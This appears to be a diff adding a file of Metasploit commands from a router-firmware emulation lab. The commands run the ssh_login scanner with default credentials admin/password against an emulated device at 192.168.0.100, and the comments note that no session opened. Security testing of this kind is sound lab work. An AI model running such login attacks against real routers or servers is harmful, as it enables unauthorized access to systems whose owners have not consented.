@@ -1,0 +1,20 @@
+#These commands can be run one by one after you're inside the metasploit terminal.
+#If you're not inside metasploit terminal you should run "bash nmap_meta" in your terminal.
+
+use auxiliary/scanner/ssh/ssh_login
+show options
+
+#Since we know that the router firmware emulation is running on 192.168.0.100 we set RHOSTS on that IP address
+#If during emulation the firmware is emulated on some other IP address please replace the IP here with that IP address
+
+set RHOSTS 192.168.0.100
+
+#We can give a file as input as well using "set USERPASS_FILE <file path>"
+
+set USERNAME admin
+
+set PASSWORD password
+
+exploit
+
+#Ideally, if the exploit works a session is opened into the firmware. Unfortunately, for our case it does not work.
